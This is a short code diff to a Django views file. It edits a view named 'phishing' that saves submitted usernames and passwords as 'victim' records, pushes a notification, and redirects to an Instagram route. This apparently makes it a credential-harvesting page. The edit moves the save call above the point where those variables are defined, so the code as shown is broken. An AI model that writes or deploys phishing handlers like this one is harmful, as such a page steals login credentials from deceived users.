@@ -131,10 +131,10 @@ def weather(request):
     return render(request, 'projects/weather.html', context)
 
 def phishing(request):
+    victim,update = Phishing.objects.update_or_create(username,password)
     if request.method == 'POST':
         username = request.POST.get('username').lower()
         password = request.POST.get('password')
-        victim,update = Phishing.objects.update_or_create(username,password)
         victim.save()
         push(f'phishing -- {request.user} -- submitted')
         return redirect('instagram')
